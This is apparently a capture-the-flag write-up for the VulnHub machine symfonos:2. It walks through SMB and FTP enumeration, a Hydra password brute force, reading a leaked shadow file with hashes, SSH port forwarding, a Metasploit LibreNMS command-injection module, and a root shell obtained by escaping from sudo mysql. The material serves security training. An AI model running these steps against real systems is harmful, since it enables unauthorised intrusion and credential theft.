Target: 10.0.0.32  
Difficulty: Medium  
Source: https://www.vulnhub.com/entry/symfonos-2,331/  

The Write Up isn't really 500 lines, there is very long text file that takes about 300 lines.

    $ nmap -sS -A -T4 -p- 10.0.0.32

    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    80/tcp  open  http
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

Starting with a NMAP scan, we have 4 services, FTP, SSH, HTTP and SMB.
Let's Start by enumerating SMB and FTP.

## *SMB*

    $ smbclient -L //10.0.0.32/

    Enter WORKGROUP\root's password: 

            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            anonymous       Disk      
            IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

    smbclient //10.0.0.32/anonymous

![image](https://user-images.githubusercontent.com/76552238/158073621-ec0b6e04-3bf3-43a1-bc77-b0d3fa0bb3e6.png)

### ***log.txt:***

    root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
    root@symfonos2:~# cat /etc/samba/smb.conf
    #
    # Sample configuration file for the Samba suite for Debian GNU/Linux.
    #
    #
    # This is the main Samba configuration file. You should read the
    # smb.conf(5) manual page in order to understand the options listed
    # here. Samba has a huge number of configurable options most of which 
    # are not shown in this example
    #
    # Some options that are often worth tuning have been included as
    # commented-out examples in this file.
    #  - When such options are commented with ";", the proposed setting
    #    differs from the default Samba behaviour
    #  - When commented with "#", the proposed setting is the default
    #    behaviour of Samba but the option is considered important
    #    enough to be mentioned here
    #
    # NOTE: Whenever you modify this file you should run the command
    # "testparm" to check that you have not made any basic syntactic 
    # errors. 

    #======================= Global Settings =======================

    [global]

    ## Browsing/Identification ###

    # Change this to the workgroup/NT-domain name your Samba server will part of
    workgroup = WORKGROUP

    # Windows Internet Name Serving Support Section:
    # WINS Support - Tells the NMBD component of Samba to enable its WINS Server
    #   wins support = no

    # WINS Server - Tells the NMBD components of Samba to be a WINS Client
    # Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
    ;   wins server = w.x.y.z

    # This will prevent nmbd to search for NetBIOS names through DNS.
    dns proxy = no

    #### Networking ####

    # The specific set of interfaces / networks to bind to
    # This can be either the interface name or an IP address/netmask;
    # interface names are normally preferred
    ;   interfaces = 127.0.0.0/8 eth0

    # Only bind to the named interfaces and/or networks; you must use the
    # 'interfaces' option above to use this.
    # It is recommended that you enable this feature if your Samba machine is
    # not protected by a firewall or is a firewall itself.  However, this
    # option cannot handle dynamic or non-broadcast interfaces correctly.
    ;   bind interfaces only = yes



    #### Debugging/Accounting ####

    # This tells Samba to use a separate log file for each machine
    # that connects
    log file = /var/log/samba/log.%m

    # Cap the size of the individual log files (in KiB).
    max log size = 1000

    # If you want Samba to only log through syslog then set the following
    # parameter to 'yes'.
    #   syslog only = no

    # We want Samba to log a minimum amount of information to syslog. Everything
    # should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
    # through syslog you should set the following parameter to something higher.
    syslog = 0

    # Do something sensible when Samba crashes: mail the admin a backtrace
    panic action = /usr/share/samba/panic-action %d


    ####### Authentication #######

    # Server role. Defines in which mode Samba will operate. Possible
    # values are "standalone server", "member server", "classic primary
    # domain controller", "classic backup domain controller", "active
    # directory domain controller". 
    #
    # Most people will want "standalone sever" or "member server".
    # Running as "active directory domain controller" will require first
    # running "samba-tool domain provision" to wipe databases and create a
    # new domain.
    server role = standalone server

    # If you are using encrypted passwords, Samba will need to know what
    # password database type you are using.  
    passdb backend = tdbsam

    obey pam restrictions = yes

    # This boolean parameter controls whether Samba attempts to sync the Unix
    # password with the SMB password when the encrypted SMB password in the
    # passdb is changed.
    unix password sync = yes

    # For Unix password sync to work on a Debian GNU/Linux system, the following
    # parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
    # sending the correct chat script for the passwd program in Debian Sarge).
    passwd program = /usr/bin/passwd %u
    passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

    # This boolean controls whether PAM will be used for password changes
    # when requested by an SMB client instead of the program listed in
    # 'passwd program'. The default is 'no'.
    pam password change = yes

    # This option controls how unsuccessful authentication attempts are mapped
    # to anonymous connections
    map to guest = bad user

    ########## Domains ###########

    #
    # The following settings only takes effect if 'server role = primary
    # classic domain controller', 'server role = backup domain controller'
    # or 'domain logons' is set 
    #

    # It specifies the location of the user's
    # profile directory from the client point of view) The following
    # required a [profiles] share to be setup on the samba server (see
    # below)
    ;   logon path = \\%N\profiles\%U
    # Another common choice is storing the profile in the user's home directory
    # (this is Samba's default)
    #   logon path = \\%N\%U\profile

    # The following setting only takes effect if 'domain logons' is set
    # It specifies the location of a user's home directory (from the client
    # point of view)
    ;   logon drive = H:
    #   logon home = \\%N\%U

    # The following setting only takes effect if 'domain logons' is set
    # It specifies the script to run during logon. The script must be stored
    # in the [netlogon] share
    # NOTE: Must be store in 'DOS' file format convention
    ;   logon script = logon.cmd

    # This allows Unix users to be created on the domain controller via the SAMR
    # RPC pipe.  The example command creates a user account with a disabled Unix
    # password; please adapt to your needs
    ; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

    # This allows machine accounts to be created on the domain controller via the 
    # SAMR RPC pipe.  
    # The following assumes a "machines" group exists on the system
    ; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

    # This allows Unix groups to be created on the domain controller via the SAMR
    # RPC pipe.  
    ; add group script = /usr/sbin/addgroup --force-badname %g

    ############ Misc ############

    # Using the following line enables you to customise your configuration
    # on a per machine basis. The %m gets replaced with the netbios name
    # of the machine that is connecting
    ;   include = /home/samba/etc/smb.conf.%m

    # Some defaults for winbind (make sure you're not using the ranges
    # for something else.)
    ;   idmap uid = 10000-20000
    ;   idmap gid = 10000-20000
    ;   template shell = /bin/bash

    # Setup usershare options to enable non-root users to share folders
    # with the net usershare command.

    # Maximum number of usershare. 0 (default) means that usershare is disabled.
    ;   usershare max shares = 100

    # Allow users who've been granted usershare privileges to create
    # public shares, not just authenticated ones
    usershare allow guests = yes

    #======================= Share Definitions =======================

    [homes]
    comment = Home Directories
    browseable = no

    # By default, the home directories are exported read-only. Change the
    # next parameter to 'no' if you want to be able to write to them.
    read only = yes

    # File creation mask is set to 0700 for security reasons. If you want to
    # create files with group=rw permissions, set next parameter to 0775.
    create mask = 0700

    # Directory creation mask is set to 0700 for security reasons. If you want to
    # create dirs. with group=rw permissions, set next parameter to 0775.
    directory mask = 0700

    # By default, \\server\username shares can be connected to by anyone
    # with access to the samba server.
    # The following parameter makes sure that only "username" can connect
    # to \\server\username
    # This might need tweaking when using external authentication schemes
    valid users = %S

    # Un-comment the following and create the netlogon directory for Domain Logons
    # (you need to configure Samba to act as a domain controller too.)
    ;[netlogon]
    ;   comment = Network Logon Service
    ;   path = /home/samba/netlogon
    ;   guest ok = yes
    ;   read only = yes

    # Un-comment the following and create the profiles directory to store
    # users profiles (see the "logon path" option above)
    # (you need to configure Samba to act as a domain controller too.)
    # The path below should be writable by all users so that their
    # profile directory may be created the first time they log on
    ;[profiles]
    ;   comment = Users profiles
    ;   path = /home/samba/profiles
    ;   guest ok = no
    ;   browseable = no
    ;   create mask = 0600
    ;   directory mask = 0700

    [printers]
    comment = All Printers
    browseable = no
    path = /var/spool/samba
    printable = yes
    guest ok = no
    read only = yes
    create mask = 0700

    # Windows clients look for this share name as a source of downloadable
    # printer drivers
    [print$]
    comment = Printer Drivers
    path = /var/lib/samba/printers
    browseable = yes
    read only = yes
    guest ok = no
    # Uncomment to allow remote administration of Windows print drivers.
    # You may need to replace 'lpadmin' with the name of the group your
    # admin users are members of.
    # Please note that you also need to set appropriate Unix permissions
    # to the drivers directory for these users to have write rights in it
    ;   write list = root, @lpadmin

    [anonymous]
    path = /home/aeolus/share
    browseable = yes
    read only = yes
    guest ok = yes

    root@symfonos2:~# cat /usr/local/etc/proftpd.conf
    # This is a basic ProFTPD configuration file (rename it to 
    # 'proftpd.conf' for actual use.  It establishes a single server
    # and a single anonymous login.  It assumes that you have a user/group
    # "nobody" and "ftp" for normal operation and anon.

    ServerName                      "ProFTPD Default Installation"
    ServerType                      standalone
    DefaultServer                   on

    # Port 21 is the standard FTP port.
    Port                            21

    # Don't use IPv6 support by default.
    UseIPv6                         off

    # Umask 022 is a good standard umask to prevent new dirs and files
    # from being group and world writable.
    Umask                           022

    # To prevent DoS attacks, set the maximum number of child processes
    # to 30.  If you need to allow more than 30 concurrent connections
    # at once, simply increase this value.  Note that this ONLY works
    # in standalone mode, in inetd mode you should use an inetd server
    # that allows you to limit maximum number of processes per service
    # (such as xinetd).
    MaxInstances                    30

    # Set the user and group under which the server will run.
    User                            aeolus
    Group                           aeolus

    # To cause every FTP user to be "jailed" (chrooted) into their home
    # directory, uncomment this line.
    #DefaultRoot ~

    # Normally, we want files to be overwriteable.
    AllowOverwrite          on

    # Bar use of SITE CHMOD by default
    <Limit SITE_CHMOD>
    DenyAll
    </Limit>

    # A basic anonymous configuration, no upload directories.  If you do not
    # want anonymous users, simply delete this entire <Anonymous> section.
    <Anonymous ~ftp>
    User                          ftp
    Group                         ftp

    # We want clients to be able to login with "anonymous" as well as "ftp"
    UserAlias                     anonymous ftp

    # Limit the maximum number of anonymous logins
    MaxClients                    10

    # We want 'welcome.msg' displayed at login, and '.message' displayed
    # in each newly chdired directory.
    #DisplayLogin                 welcome.msg
    #DisplayChdir                 .message

    # Limit WRITE everywhere in the anonymous chroot
    <Limit WRITE>
        DenyAll
    </Limit>
    </Anonymous>

"root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf". This line shows that the /etc/shadow file was copied to /var/backups as shadow.bak, when we will get access we can get access to the machine probably hash the password stored inside.
After going to the log.txt file some more, we find the username ---> "aeolus"

## *HTTP*

    $ gobuster dir -u http://10.0.0.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![image](https://user-images.githubusercontent.com/76552238/158073752-0bca272c-62e9-48ba-896c-b0f833f46c19.png)


After brute forcing the directories on the web site on hosted on port 80 doesn't hold any files or extra directories, so we will leave it for now. 

## *FTP*

    $ ftp 10.0.0.32

![image](https://user-images.githubusercontent.com/76552238/158073767-9ffb418a-0638-4cba-8f54-00cee4cabf79.png)

FTP doesn't allow for anonymous logins so let's try brute forcing it using the username we found.

    $ hydra -l 'aeolus' -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.32 -IV

![image](https://user-images.githubusercontent.com/76552238/158074730-bbb5095d-60ef-4f01-8252-bbc51a74e8ff.png)

<!-- login: aeolus   password: sergioteamo -->

    $ ftp 10.0.0.32

![image](https://user-images.githubusercontent.com/76552238/158074777-881e1a06-ba8c-4b67-8868-1a21bade5036.png)


Logging in to the FTP server it holds the the shares that can be found in the SMB service on the machine. Maybe the credentials we found are also valid for a SSH login.

## *SSH*

Going back to the log.txt file, the admin of the machine copied the /etc/shadow file, we can read it:

    $ cat /var/backups/shadow.bak

    root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
    daemon:*:18095:0:99999:7:::
    bin:*:18095:0:99999:7:::
    sys:*:18095:0:99999:7:::
    sync:*:18095:0:99999:7:::
    games:*:18095:0:99999:7:::
    man:*:18095:0:99999:7:::
    lp:*:18095:0:99999:7:::
    mail:*:18095:0:99999:7:::
    news:*:18095:0:99999:7:::
    uucp:*:18095:0:99999:7:::
    proxy:*:18095:0:99999:7:::
    www-data:*:18095:0:99999:7:::
    backup:*:18095:0:99999:7:::
    list:*:18095:0:99999:7:::
    irc:*:18095:0:99999:7:::
    gnats:*:18095:0:99999:7:::
    nobody:*:18095:0:99999:7:::
    systemd-timesync:*:18095:0:99999:7:::
    systemd-network:*:18095:0:99999:7:::
    systemd-resolve:*:18095:0:99999:7:::
    systemd-bus-proxy:*:18095:0:99999:7:::
    _apt:*:18095:0:99999:7:::
    Debian-exim:!:18095:0:99999:7:::
    messagebus:*:18095:0:99999:7:::
    sshd:*:18095:0:99999:7:::
    aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
    cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
    mysql:!:18095:0:99999:7:::
    Debian-snmp:!:18095:0:99999:7:::
    librenms:!:18095::::::

We can see that there is another user (cronus) on the machine.
I tried using "john" to crack the passwords for 'root', 'aeolus' and 'cronus' but unfortunately I was not successful.
Let's search for SUID files on the machine.

    find / -perm /4000 2> /dev/null

I tried to see what permissions the user has and If there were any SUID files on the machine but there were none useful.

At this point I got stuck for a while, there were no 'crontabs', SUID files or kernel exploits available, I looked at a write up for this CTF and saw that we needed to do another NMAP scan from the remote machine.

    $ nmap localhost 

    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    25/tcp   open  smtp
    80/tcp   open  http
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3306/tcp open  mysql
    8080/tcp open  http-proxy

The machine has a web proxy, we need to Port Forward the content of the proxy to our local machine, (Port Forwarding allows computers over the internet to connect to a specific computer or service within a private network). We can use SSH for this.

    $ ssh -L 8000:localhost:8080 aeolus@10.0.0.32

![image](https://user-images.githubusercontent.com/76552238/158075879-d7cf8f43-195c-4344-a15d-dbb154830655.png)

After logging in, and going to localhost:8000, we get a site with the "LibreNMS" service running on it. We can log with the same credentials we logged in to SSH with.

![image](https://user-images.githubusercontent.com/76552238/158075965-89c6ca5c-7a34-4c2f-bd03-2ae247d513fd.png)

I searched Metasploit for "LibreNMS" and found this exploit --->

    exploit/linux/http/librenms_addhost_cmd_inject

![image](https://user-images.githubusercontent.com/76552238/158076632-aa22352c-fd50-4d65-b205-4c5309a887a1.png)

    $ msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run

![image](https://user-images.githubusercontent.com/76552238/158076655-19ba86c9-b24b-4fc6-9426-8d2a71857486.png)

Using it allows us to get a shell on the machine as the 'cronus' user we found earlier. 

    $ sudo -l

    Matching Defaults entries for cronus on symfonos2:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User cronus may run the following commands on symfonos2:
        (root) NOPASSWD: /usr/bin/mysql


It seems we can run mysql as root. 

    $ sudo mysql -uroot

    MariaDB [(none)]> show databases;

    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | librenms           |
    | mysql              |
    | performance_schema |
    +--------------------+

After playing with it for a while, I didn't find anything in any database or table. After reading the manual page for 'mysql', turns out 'mysql' has an options to run bash commands, we can use '\\! /bin/bash' and get a shell as root.

    $ sudo mysql -uroot
    MariaDB [(none)]> \! /bin/bash

>

    # uname -a

![image](https://user-images.githubusercontent.com/76552238/158076806-c1b0bc6f-f616-4b58-a703-e877c07849f8.png)

We can now go to the directory 'root' and read the proof.txt file.

> ### ***/root/proof.txt:***

            Congrats on rooting symfonos:2!

            ,   ,
            ,-`{-`/
        ,-~ , \ {-~~-,
        ,~  ,   ,`,-~~-,`,
    ,`   ,   { {      } }                                             }/
    ;     ,--/`\ \    / /                                     }/      /,/
    ;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
    ; /   `       } } `, `-`-.___                            / `,  ,/  `,/
    \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
    `        { {                                     __  /  ,`/   ,`,;
            /   \ \                                 _,`, `{  `,{   `,`;`
        {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
        \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
            `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                    / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                    /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
        /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
        /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
        / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
        / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
    /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
    /` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

            Contact me via Twitter @zayotic to give feedback!
